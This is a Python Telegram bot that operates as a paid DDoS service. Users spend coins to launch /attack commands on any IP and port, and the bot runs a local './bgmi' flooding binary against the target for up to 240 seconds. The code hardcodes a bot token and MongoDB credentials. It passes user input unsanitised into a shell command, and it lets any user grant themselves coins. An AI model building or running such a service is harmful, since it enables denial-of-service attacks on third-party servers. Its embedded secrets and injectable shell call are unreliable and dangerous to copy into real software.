import asyncio
from datetime import datetime, timedelta
from collections import defaultdict
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

bot_start_time = datetime.now()
TELEGRAM_BOT_TOKEN = '7704601052:AAGc6yvmL1-AUHDmvjUmKmu90jMW3_Ihc4Q'
ADMIN_USER_ID = 1342302666
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "legacy10"
COLLECTION_NAME = "users"

ATTACK_TIME_LIMIT = 240  # Max attack duration (seconds)
COINS_REQUIRED_PER_ATTACK = 5  # Coins per attack
ATTACK_COOLDOWN = 60  # Cooldown period per user (seconds)
MAX_CONCURRENT_ATTACKS = 5  # Maximum number of allowed attacks at a time

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

# Store active attacks
active_attacks = []
last_attack_time = defaultdict(lambda: datetime.min)

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def attack(update: Update, context: CallbackContext):
    global active_attacks

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user_id != ADMIN_USER_ID:
        now = datetime.now()
        elapsed_time = (now - last_attack_time[user_id]).total_seconds()
        if elapsed_time < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - elapsed_time)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ Cooldown active! Wait {remaining_cooldown} seconds.",
                parse_mode='Markdown'
            )
            return

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(chat_id=chat_id, text="💰 Insufficient coins!", parse_mode='Markdown')
        return

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        active_attack_info = "\n".join(
            [f"💣 IP: {atk['ip']} | Port: {atk['port']} | Ends in: {int((atk['end_time'] - datetime.now()).total_seconds())}s"
             for atk in active_attacks]
        )
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"⚠️ Max concurrent attacks reached! Try again later.\n\n🔥 **Active Attacks:**\n{active_attack_info}",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ Usage: /attack <ip> <port> <duration>",
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"⛔ Max duration is {ATTACK_TIME_LIMIT} seconds.",
            parse_mode='Markdown'
        )
        return

    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_end_time = datetime.now() + timedelta(seconds=duration)
    active_attacks.append({"user_id": user_id, "ip": ip, "port": port, "end_time": attack_end_time})

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 Attack Started!\n💣 Target: {ip}\n🔢 Port: {port}\n🕒 Duration: {duration}s\n💰 Remaining Coins: {new_balance}",
        parse_mode='Markdown'
    )

    last_attack_time[user_id] = datetime.now()
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, user_id))

async def run_attack(chat_id, ip, port, duration, context, user_id):
    global active_attacks
    try:
        command = f"./bgmi {ip} {port} {duration} {350} {60}"
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error: {str(e)}", parse_mode='Markdown')

    finally:
        active_attacks = [atk for atk in active_attacks if atk["user_id"] != user_id]
        await context.bot.send_message(chat_id=chat_id, text="✅ Attack finished!", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    user = await get_user(user_id)
    balance = user["coins"]
    await context.bot.send_message(chat_id=chat_id, text=f"📝 Your Info:\n💰 Coins: {balance}", parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "🛠️ Help Menu 🛠️\n\n"
        "🔥 /attack <ip> <port> <duration>\n"
        "💳 /myinfo - Check your balance\n"
        "❓ /help - Show this menu"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_coins(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: /add_coins <amount>", parse_mode='Markdown')
        return

    try:
        coins_to_add = int(args[0])
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Enter a valid number!", parse_mode='Markdown')
        return

    user = await get_user(user_id)
    new_balance = user["coins"] + coins_to_add
    await update_user(user_id, new_balance)

    await context.bot.send_message(chat_id=chat_id, text=f"✅ {coins_to_add} coins added. New balance: {new_balance}.", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("add_coins", add_coins))
    application.run_polling()

if __name__ == '__main__':
    main()
